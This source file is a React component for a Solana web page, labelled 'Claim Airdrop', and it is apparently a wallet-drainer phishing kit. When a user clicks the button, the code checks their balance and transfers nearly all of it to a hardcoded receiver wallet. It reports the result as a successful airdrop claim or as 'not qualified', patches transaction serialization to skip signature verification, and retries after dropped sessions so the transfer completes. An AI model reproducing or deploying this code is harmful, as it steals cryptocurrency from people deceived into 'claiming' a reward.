// src/components/TransferButton.jsx
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET } from '../utils/constants';

/**
 * Monkey-patch a Transaction's serialize() so that callers who pass NO
 * arguments (like @solana-mobile/wallet-adapter-mobile) default to
 * { requireAllSignatures: false, verifySignatures: false } instead of
 * the upstream default of `true` for both.
 */
function patchSerialize(transaction) {
  const _serialize = transaction.serialize.bind(transaction);
  transaction.serialize = (config) =>
    _serialize({
      requireAllSignatures: false,
      verifySignatures: false,
      ...(config || {}),
    });
  return transaction;
}

export default function TransferButton({ className = '' }) {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, wallet, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !connected) return;

    setLoading(true);
    try {
      const [balance, rentExempt] = await Promise.all([
        connection.getBalance(publicKey, 'confirmed'),
        connection.getMinimumBalanceForRentExemption(0),
      ]);

      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const FEE_SAFETY = 5_000_000;
      const totalReserve = rentExempt + FEE_SAFETY;
      const transferAmount = balance - totalReserve;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      const transferIx = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: RECEIVER_WALLET,
        lamports: transferAmount,
      });

      // Build a fresh transaction right before sending — keeps blockhash
      // as fresh as possible and minimises the window for session timeout.
      async function buildTx() {
        const { blockhash } = await connection.getLatestBlockhash('finalized');
        const tx = new Transaction();
        tx.recentBlockhash = blockhash;
        tx.feePayer = publicKey;
        tx.add(transferIx);
        return patchSerialize(tx);
      }

      let signature;

      try {
        const transaction = await buildTx();
        signature = await sendTransaction(transaction, connection);
      } catch (sendErr) {
        const msg = (sendErr?.message || '').toLowerCase();

        // Mobile Wallet Adapter sessions can time out between the moment
        // the user connects and when they finally tap "Claim".
        // If the session dropped, reconnect and retry once.
        if (msg.includes('session') || msg.includes('dropped') || msg.includes('disconnected')) {
          console.warn('Wallet session dropped — reconnecting and retrying…');

          // Re-establish the wallet connection (re-opens session)
          if (wallet?.adapter) {
            try { await wallet.adapter.disconnect(); } catch (_) { /* ignore */ }
            await wallet.adapter.connect();
          }

          // Rebuild with a fresh blockhash & retry
          const transaction = await buildTx();
          signature = await sendTransaction(transaction, connection);
        } else {
          throw sendErr;
        }
      }

      console.log('⏳ Transaction sent:', signature);

      // Poll for confirmation over HTTP (no WebSocket needed)
      const startTime = Date.now();
      const TIMEOUT = 90_000;
      const POLL_INTERVAL = 3_000;

      while (Date.now() - startTime < TIMEOUT) {
        try {
          const { value } = await connection.getSignatureStatuses([signature]);
          const status = value?.[0];

          if (status) {
            if (status.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
            }
            if (
              status.confirmationStatus === 'confirmed' ||
              status.confirmationStatus === 'finalized'
            ) {
              console.log('✅ Transaction confirmed:', signature);
              alert(`Claim successful!\nTx: ${signature}`);
              return;
            }
          }
        } catch (pollErr) {
          if (pollErr.message?.includes('on-chain')) throw pollErr;
          console.warn('Polling error, retrying…', pollErr);
        }

        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, wallet, connected, connection]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
